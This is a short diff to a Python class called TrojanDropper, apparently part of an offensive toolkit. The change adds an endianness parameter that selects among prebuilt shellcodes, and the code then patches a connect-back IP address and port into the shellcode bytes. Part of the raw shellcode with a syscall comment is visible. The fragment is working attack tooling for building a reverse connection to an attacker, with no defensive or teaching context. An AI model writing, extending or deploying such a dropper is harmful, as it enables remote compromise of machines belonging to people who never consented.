@@ -72,9 +72,9 @@ class TrojanDropper:
         "\x0c\x01\x01\x01"  # syscall	0x40404
 ],'')
 
-    def __init__(self,connectback_ip,port=8080):
+    def __init__(self,connectback_ip,endianness,port=8080):
         port=int(port)
-        shellcode=self.__class__.shellcode
+        shellcode=self.__class__.shellcodes[endianness]
         i = 0
         for c in socket.inet_aton(connectback_ip):
             shellcode = shellcode.replace("IP%d" % i, c)
